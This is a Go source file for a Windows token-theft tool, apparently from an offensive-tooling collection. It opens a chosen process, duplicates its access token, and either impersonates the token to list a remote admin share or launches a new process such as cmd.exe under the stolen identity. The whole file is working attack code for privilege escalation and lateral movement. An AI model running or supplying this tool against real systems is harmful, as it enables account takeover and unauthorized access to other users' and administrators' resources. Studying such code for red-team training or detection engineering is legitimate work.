// +build windows

package main

import (
	// Standard
	"flag"
	"fmt"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"log"
	"os"

	// Oddments Internal
	"github.com/Ne0nd0g/oddments/pkg/privs"
	"github.com/Ne0nd0g/oddments/pkg/tokens"
	"github.com/Ne0nd0g/oddments/windows/advapi32"
	"github.com/Ne0nd0g/oddments/windows/kernel32"
)

var verbose bool
var debug bool

func main() {
	flag.BoolVar(&verbose, "verbose", false, "Enable verbose output")
	flag.BoolVar(&debug, "debug", false, "Enable debug output")
	pid := flag.Uint("pid", 0, "The process ID to steal a token from")
	create := flag.Bool("create", false, "Create a new process with stolen token")
	proc := flag.String("process", "cmd.exe", "The process to run as the provided user")
	args := flag.String("args", "/k whoami /all", "Arguments to run the process with")
	path := flag.String("path", "\\\\127.0.0.1\\ADMIN$", "A network file share UNC path to retrieve the contents of with the stolen token")
	flag.Usage = func() {
		flag.PrintDefaults()
		os.Exit(0)
	}
	flag.Parse()

	if *pid == 0 {
		flag.Usage()
	}

	if *create && *proc == "" {
		fmt.Println("A value must be provided with the -process argument")
		flag.Usage()
	}

	if !*create && *path == "" {
		fmt.Println("A value must be provided with the -path argument")
		flag.Usage()
	}

	// Display token information
	if debug {
		fmt.Println("[DEBUG] Retrieving Primary and Impersonation token information...")
	}
	whoami, err := tokens.WhoamiG()
	if err != nil {
		log.Fatal(err)
	}
	if verbose {
		fmt.Printf("[-] Token WhoAmI:\n%s\n", whoami)
	}

	// Get a handle to the target process
	if debug {
		fmt.Println("[DEBUG] Calling OpenProcess...")
	}

	handle, err := kernel32.OpenProcessG(uint32(*pid), windows.PROCESS_QUERY_INFORMATION, true)
	if err != nil {
		log.Fatal(err)
	}
	if verbose {
		fmt.Printf("[-] Got handle to PID %d: 0x%X\n", *pid, handle)
	}

	// Defer closing the process handle
	defer func() {
		if debug {
			fmt.Println("[DEBUG] Calling CloseHandle on the process handle...")
		}
		err = windows.CloseHandle(handle)
		if err != nil {
			log.Fatal(err)
		}
		if verbose {
			fmt.Println("[-] Successfully closed the process handle")
		}
	}()

	// Use the process handle to get its access token
	if debug {
		fmt.Println("[DEBUG] Calling OpenProcessToken...")
	}
	// These token privs are required to call CreateProcessWithToken later
	DesiredAccess := windows.TOKEN_DUPLICATE | windows.TOKEN_ASSIGN_PRIMARY | windows.TOKEN_QUERY
	var token windows.Token
	err = windows.OpenProcessToken(handle, uint32(DesiredAccess), &token)
	if err != nil {
		log.Fatal(err)
	}
	if verbose {
		fmt.Printf("[-] Got token for PID %d: 0x%X\n", *pid, token)
	}

	// Defer closing the token handle
	defer func() {
		if debug {
			fmt.Println("[DEBUG] Calling CloseHandle on the token handle...")
		}
		err = token.Close()
		if err != nil {
			log.Fatal(err)
		}
		if verbose {
			fmt.Println("[-] Successfully closed the token handle")
		}
	}()

	// Apply the token to this process
	if !*create {
		if debug {
			fmt.Println("[DEBUG] Calling tokens.ImpersonateLoggedOnUserN...")
		}
		err = advapi32.ImpersonateLoggedOnUserG(token)
		if err != nil {
			log.Fatal(err)
		}
		if verbose {
			fmt.Println("[-] Successfully applied the stolen token")
		}
		fmt.Printf("[+] Successfully stole token from PID %d and applied it to this process\n", *pid)

		// Insert native Go code here you want to use the thread impersonation token

		// Use the stolen token to list the contents of a remote file share
		// This should be a resource that the process token can't access, but the threat token can
		if debug {
			fmt.Printf("[DEBUG] Using stolen token to remotely list the contents of %s...\n", *path)
		}
		files, err := ioutil.ReadDir(*path)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Printf("\nDirectory listing for %s\n\n", *path)
		for _, file := range files {
			fmt.Printf("%s\t%d\t%s\n", file.Mode(), file.Size(), file.Name())
		}
		fmt.Println()

		// Display token information
		if debug {
			fmt.Println("[DEBUG] Retrieving Primary and Impersonation token information...")
		}
		whoami, err = tokens.WhoamiG()
		if err != nil {
			log.Fatal(err)
		}
		if verbose {
			fmt.Printf("[-] Token WhoAmI:\n%s\n", whoami)
		}

		// List stolen access token privileges
		if debug {
			fmt.Println("[DEBUG] Getting the current (calling) process access token privileges...")
			parentPrivs, err := privs.GetPrivilegesG(windows.GetCurrentProcessToken())
			if err != nil {
				fmt.Printf("[!] %s\n", err)
			}
			fmt.Println("[-] Current (calling) process access token privileges:")
			for _, p := range parentPrivs {
				fmt.Printf("\t%s\n", p)
			}

			fmt.Println("[DEBUG] Getting stolen access token privileges...")
			privileges, err := privs.GetPrivilegesG(token)
			if err != nil {
				fmt.Printf("[!] %s\n", err)
			}
			fmt.Println("[-] Stolen access token privileges:")
			for _, p := range privileges {
				fmt.Printf("\t%s\n", p)
			}
		}

		// Revert to self - Drop the stolen token
		if debug {
			fmt.Println("[DEBUG] Calling tokens.RevertTotSelfN()...")
		}
		err = windows.RevertToSelf()
		if err != nil {
			fmt.Printf("[!] %s\n", err)
		}
		if verbose {
			fmt.Println("[-] Successfully reverted to self and dropped the stolen token")
		}
	}

	// Create a new process with the stolen token
	if *create {
		// Convert stolen impersonation token into a primary token
		if debug {
			fmt.Println("[DEBUG] Calling tokens.DuplicateTokenN...")
		}

		var dupToken windows.Token
		err = windows.DuplicateTokenEx(token, windows.MAXIMUM_ALLOWED, &windows.SecurityAttributes{}, windows.SecurityImpersonation, windows.TokenPrimary, &dupToken)
		if err != nil {
			log.Fatal(err)
		}
		if verbose {
			fmt.Printf("[+] Successfully duplicated the stolen token: %v\n", dupToken)
		}

		// Create a process with the token
		if debug {
			fmt.Println("[DEBUG] Calling tokens.CreateProcessWithTokenG...")
		}
		err = tokens.CreateProcessWithTokenG(dupToken, *proc, *args)
		if err != nil {
			log.Fatal(err)
		}

		fmt.Printf("[+] Successfully created the %s process with the stolen token from PID %d\n", *proc, *pid)
	}
}
